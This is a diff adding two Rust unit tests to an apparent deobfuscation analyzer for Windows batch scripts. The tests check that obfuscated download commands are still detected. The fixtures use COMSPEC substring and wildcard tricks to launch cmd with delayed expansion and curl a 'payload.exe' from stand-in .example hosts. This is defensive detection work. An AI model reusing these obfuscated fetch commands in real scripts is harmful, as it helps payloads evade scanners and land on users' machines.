@@ -1524,6 +1524,42 @@ start payload.chm"#;
     }
 
     #[test]
+    fn comspec_substring_cmd_child_preserves_delayed_expansion() {
+        let script = br#"%COMSPEC:~-7% /V:ON /c "set U=https://comspec-slice.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://comspec-slice.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "%COMSPEC:~-7% cmd child did not preserve delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn comspec_wildcard_cmd_child_preserves_delayed_expansion() {
+        let script = br#"%COMSPEC:*System32\=% /V:ON /c "set U=https://comspec-wild.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://comspec-wild.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "%COMSPEC:*System32\\=% cmd child did not preserve delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn start_comspec_child_preserves_delayed_expansion() {
         let script = br#"start "" /b %COMSPEC% /V:ON /c "set U=https://start-comspec.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &AnalyzeConfig::default());
